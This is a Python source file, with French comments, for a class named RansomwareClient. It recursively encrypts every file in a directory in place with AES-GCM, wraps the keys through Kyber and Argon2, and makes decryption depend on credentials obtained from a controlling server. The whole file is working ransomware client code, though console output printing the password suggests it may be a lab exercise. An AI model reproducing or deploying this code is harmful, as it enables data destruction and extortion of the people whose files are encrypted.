"""
Gère chiffrement et déchiffrement fichiers
"""

import os
import json
import base64
from typing import Dict
from pathlib import Path

import config
import crypto_utils
import wordlist
from server import server


class RansomwareClient:
    """
    Client chiffrement et déchiffrement fichiers
    """

    def __init__(self, base_path: str = "."):
        """
        Initialise client

        Args:
            base_path: Répertoire pour opérations
        """
        self.base_path = Path(base_path).resolve()
        self.rootkey_path = self.base_path / config.ROOTKEY_FILENAME

    def _should_skip_file(self, file_path: Path) -> bool:
        """
        Vérifie si fichier doit pas être chiffré

        Args:
            file_path: Chemin fichier

        Returns:
            True si fichier doit pas être chiffré
        """
        # Ignore fichiers exclus
        if file_path.name in config.EXCLUDED_FILES:
            return True

        # Ignore extensions exclues
        if file_path.suffix in config.EXCLUDED_EXTENSIONS:
            return True

        return False

    def _should_skip_dir(self, dir_name: str) -> bool:
        """
        Vérifie si dossier doit pas être chiffré

        Args:
            dir_name: Nom dossier

        Returns:
            True si dossier doit pas être chiffré
        """
        return dir_name in config.EXCLUDED_DIRS

    def encrypt_directory(self, path: str = ".") -> None:
        """
        Chiffre tous fichiers d'un dossier

        Args:
            path: Chemin dossier à chiffrer
        """
        target_path = Path(path).resolve()

        print(f"\n[CLT] Démarrage du chiffrement de {target_path}")

        # Initialise serveur et récupère credentials
        print("[CLT] Initialisation au serveur")
        server_data = server.initialize_server()

        password = server_data["password"]
        salt = server_data["salt"]
        argon2_params = server_data["argon2_params"]
        kyber_public_key = server_data["kyber_public_key"]

        # Dérive MK avec Argon2
        print("[CLT] Dérive MK")
        master_key = crypto_utils.derive_key_argon2(
            password=password,
            salt=salt,
            **argon2_params
        )

        # Génère RK avec Kyber
        print("[CLT] Génère RK")
        kyber_ciphertext, root_key = crypto_utils.kyber_encapsulate(kyber_public_key)

        # Encapsule RK avec MK
        print("[CLT] Encapsule RK avec MK")
        wrapped_rk_ciphertext, wrapped_rk_nonce, wrapped_rk_tag = crypto_utils.wrap_key_aes_gcm(root_key, master_key)

        # Sauvegarde infos RK dans rootkey.bin
        print(f"[CLT] Sauvegarde de RK dans rootkey.bin")
        rootkey_data = {
            "wrapped_rk_ciphertext": base64.b64encode(wrapped_rk_ciphertext).decode('utf-8'),
            "wrapped_rk_nonce": base64.b64encode(wrapped_rk_nonce).decode('utf-8'),
            "wrapped_rk_tag": base64.b64encode(wrapped_rk_tag).decode('utf-8'),
            "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
            "salt": base64.b64encode(salt).decode('utf-8'),
            "argon2_params": argon2_params,
        }

        with open(self.rootkey_path, 'w') as f:
            json.dump(rootkey_data, f, indent=2)

        # Parcourt et chiffre fichiers
        print("[CLT] Parcourt et chiffre fichiers")
        encrypted_count = 0

        for root, dirs, files in os.walk(target_path):
            # Filtre dossiers à ignorer
            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]

            for filename in files:
                file_path = Path(root) / filename

                # Ignore fichiers à ne pas chiffrer
                if self._should_skip_file(file_path):
                    continue

                # Chiffre fichier
                try:
                    self._encrypt_file(file_path, root_key)
                    encrypted_count += 1
                except Exception as e:
                    print(f"  [ERR] Erreur chiffrement de {file_path.name}: {e}")

        print(f"\n[CLT] Chiffrement terminé : {encrypted_count} fichier(s) chiffré(s)")
        print(f"[CLT] Mot de passe : {password}")

    def _encrypt_file(self, file_path: Path, root_key: bytes) -> None:
        """
        Chiffre un fichier

        Args:
            file_path: Chemin fichier à chiffrer
            root_key: RK pour encapsuler clé fichier
        """
        print(f"  [ENCRYPT] {file_path.name}")

        # Lit fichier
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        # Génère clé fichier aléatoire
        file_key = crypto_utils.generate_random_key()

        # Chiffre avec AES-GCM
        ciphertext, nonce, tag = crypto_utils.encrypt_aes_gcm(plaintext, file_key)

        # Encapsule clé fichier avec RK
        wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag = crypto_utils.wrap_key_aes_gcm(file_key, root_key)

        # Crée métadonnées
        metadata = {
            "wrapped_key_ciphertext": base64.b64encode(wrapped_key_ciphertext).decode('utf-8'),
            "wrapped_key_nonce": base64.b64encode(wrapped_key_nonce).decode('utf-8'),
            "wrapped_key_tag": base64.b64encode(wrapped_key_tag).decode('utf-8'),
            "nonce": base64.b64encode(nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
        }

        # Sauvegarde métadonnées dans fichier .meta
        meta_path = file_path.with_suffix(file_path.suffix + config.META_EXTENSION)
        with open(meta_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        # Écrase fichier original avec contenu chiffré
        with open(file_path, 'wb') as f:
            f.write(ciphertext)

    def decrypt_all(self, path: str = ".") -> None:
        """
        Déchiffre tous les fichiers

        Args:
            path: Chemin dossier à déchiffrer
        """
        target_path = Path(path).resolve()

        print(f"\n[CLT] Démarrage du déchiffrement {target_path}")

        # Credentials au serveur
        credentials = server.request_full_decryption_credentials()

        password = credentials["password"]
        salt = credentials["salt"]
        argon2_params = credentials["argon2_params"]

        # Dérive MK
        print("[CLT] Dérive MK")
        master_key = crypto_utils.derive_key_argon2(
            password=password,
            salt=salt,
            **argon2_params
        )

        # Lit rootkey.bin et désencapsule RK
        print("[CLT] Lecture de rootkey.bin")
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Fichier {config.ROOTKEY_FILENAME} pas trouvé")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        wrapped_rk_ciphertext = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
        wrapped_rk_nonce = base64.b64decode(rootkey_data["wrapped_rk_nonce"])
        wrapped_rk_tag = base64.b64decode(rootkey_data["wrapped_rk_tag"])

        print("[CLT] Désencapsule RK")
        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_ciphertext, master_key, wrapped_rk_nonce, wrapped_rk_tag)

        # Parcourt et déchiffre tous les fichiers
        print("[CLT] Parcourt et déchiffre tous les fichiers")
        decrypted_count = 0

        for root, dirs, files in os.walk(target_path):
            # Filtre dossiers à ne pas chiffrer
            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]

            for filename in files:
                # Cherche fichiers .meta
                if not filename.endswith(config.META_EXTENSION):
                    continue

                meta_path = Path(root) / filename
                encrypted_path = meta_path.with_suffix('')

                try:
                    self._decrypt_file_with_rk(encrypted_path, meta_path, root_key)
                    decrypted_count += 1
                except Exception as e:
                    print(f"  [ERR] Erreur déchiffrement de {filename}: {e}")

        print(f"\n[CLT] Déchiffrement terminé : {decrypted_count} fichier(s) déchiffré(s)")

    def _decrypt_file_with_rk(self, encrypted_path: Path, meta_path: Path, root_key: bytes) -> None:
        """
        Déchiffre un fichier avec RK

        Args:
            encrypted_path: Chemin fichier chiffré
            meta_path: Chemin fichier de métadonnées
            root_key: RK pour désencapsuler clé du fichier
        """
        print(f"  [DECRYPT] {encrypted_path.name}")

        # Lit métadonnées
        with open(meta_path, 'r') as f:
            metadata = json.load(f)

        wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
        wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
        wrapped_key_tag = base64.b64decode(metadata["wrapped_key_tag"])
        nonce = base64.b64decode(metadata["nonce"])
        tag = base64.b64decode(metadata["tag"])

        # Lit fichier chiffré
        with open(encrypted_path, 'rb') as f:
            ciphertext = f.read()

        # Désencapsule clé de fichier
        file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_ciphertext, root_key, wrapped_key_nonce, wrapped_key_tag)

        # Déchiffre
        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)

        # Écrase fichier avec contenu normal
        with open(encrypted_path, 'wb') as f:
            f.write(plaintext)

        # Supprime .meta
        meta_path.unlink()

    def decrypt_file(self, file_path: str) -> None:
        """
        Déchiffre un seul fichier en demandant la clé au serveur

        Args:
            file_path: Chemin du fichier à déchiffrer (ou son .meta)
        """
        # Vérifie si c'est .meta ou fichier chiffré
        file_path_obj = Path(file_path).resolve()

        if file_path_obj.name.endswith(config.META_EXTENSION):
            meta_path = file_path_obj
            encrypted_path = meta_path.with_suffix('')
        else:
            encrypted_path = file_path_obj
            meta_path = Path(str(encrypted_path) + config.META_EXTENSION)

        if not meta_path.exists():
            raise FileNotFoundError(f"Fichier métadonnées {meta_path} pas trouvé")

        if not encrypted_path.exists():
            raise FileNotFoundError(f"Fichier chiffré {encrypted_path} pas trouvé")

        print(f"\n[CLT] Déchiffrement fichier {encrypted_path.name}")

        # Lit métadonnées
        with open(meta_path, 'r') as f:
            metadata = json.load(f)

        wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
        wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
        wrapped_key_tag = base64.b64decode(metadata["wrapped_key_tag"])

        # kyber_ciphertext depuis rootkey.bin
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])

        # Serveur désencapsule la clé
        print("[CLT] Désencapsule clé fichier")
        file_key = server.request_file_key_unwrap(wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag, kyber_ciphertext)

        # Lit fichier chiffré
        with open(encrypted_path, 'rb') as f:
            ciphertext = f.read()

        # Déchiffre fichier
        nonce = base64.b64decode(metadata["nonce"])
        tag = base64.b64decode(metadata["tag"])

        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)

        # Écrase fichier avec contenu normal
        with open(encrypted_path, 'wb') as f:
            f.write(plaintext)

        # Supprime .meta
        meta_path.unlink()

        print(f"[CLT] Fichier déchiffré {encrypted_path}")

    def decrypt_file_with_password(self, file_path: str) -> None:
        """
        Déchiffre un seul fichier en utilisant le mot de passe

        Args:
            file_path: Chemin du fichier à déchiffrer (ou son .meta)
        """
        # Vérifie si c'est .meta ou fichier chiffré
        file_path_obj = Path(file_path).resolve()

        if file_path_obj.name.endswith(config.META_EXTENSION):
            meta_path = file_path_obj
            encrypted_path = meta_path.with_suffix('')
        else:
            encrypted_path = file_path_obj
            meta_path = Path(str(encrypted_path) + config.META_EXTENSION)

        if not meta_path.exists():
            raise FileNotFoundError(f"Fichier métadonnées {meta_path} pas trouvé")

        if not encrypted_path.exists():
            raise FileNotFoundError(f"Fichier chiffré {encrypted_path} pas trouvé")

        print(f"\n[CLT] Déchiffrement fichier avec mot de passe : {encrypted_path.name}")

        # Credentials au serveur
        credentials = server.request_full_decryption_credentials()

        password = credentials["password"]
        salt = credentials["salt"]
        argon2_params = credentials["argon2_params"]

        # Dérive MK
        print("[CLT] Dérive MK")
        master_key = crypto_utils.derive_key_argon2(
            password=password,
            salt=salt,
            **argon2_params
        )

        # Lit rootkey.bin et désencapsule RK
        print("[CLT] Lecture de rootkey.bin")
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Fichier {config.ROOTKEY_FILENAME} pas trouvé")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        wrapped_rk_ciphertext = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
        wrapped_rk_nonce = base64.b64decode(rootkey_data["wrapped_rk_nonce"])
        wrapped_rk_tag = base64.b64decode(rootkey_data["wrapped_rk_tag"])

        print("[CLT] Désencapsule RK")
        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_ciphertext, master_key, wrapped_rk_nonce, wrapped_rk_tag)

        # Déchiffre le fichier
        print("[CLT] Déchiffre le fichier")
        self._decrypt_file_with_rk(encrypted_path, meta_path, root_key)

        print(f"[CLT] Fichier déchiffré avec succès : {encrypted_path}")

    def change_password(self) -> None:
        """
        Change mdp et màj rootkey.bin
        """
        print("\n[CLT] Changement mot de passe")

        # Génère new mdp et sel
        new_password = wordlist.generate_random_password()
        new_salt = crypto_utils.generate_random_salt()

        # Mêmes paramètres Argon2
        new_argon2_params = {
            "time_cost": config.ARGON2_TIME_COST,
            "memory_cost": config.ARGON2_MEMORY_COST,
            "parallelism": config.ARGON2_PARALLELISM,
            "hash_len": config.ARGON2_HASH_LEN,
        }

        # kyber_ciphertext depuis rootkey.bin
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])

        # Demande au serveur changement mdp
        result = server.change_password(new_password, new_salt, new_argon2_params, kyber_ciphertext)

        # Màj rootkey.bin
        print("[CLT] Mise à jour de rootkey.bin")
        rootkey_data = {
            "wrapped_rk_ciphertext": base64.b64encode(result["wrapped_rk_ciphertext"]).decode('utf-8'),
            "wrapped_rk_nonce": base64.b64encode(result["wrapped_rk_nonce"]).decode('utf-8'),
            "wrapped_rk_tag": base64.b64encode(result["wrapped_rk_tag"]).decode('utf-8'),
            "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
            "salt": base64.b64encode(result["salt"]).decode('utf-8'),
            "argon2_params": result["argon2_params"],
        }

        with open(self.rootkey_path, 'w') as f:
            json.dump(rootkey_data, f, indent=2)

        print(f"[CLT] Nouveau mot de passe: {new_password}")
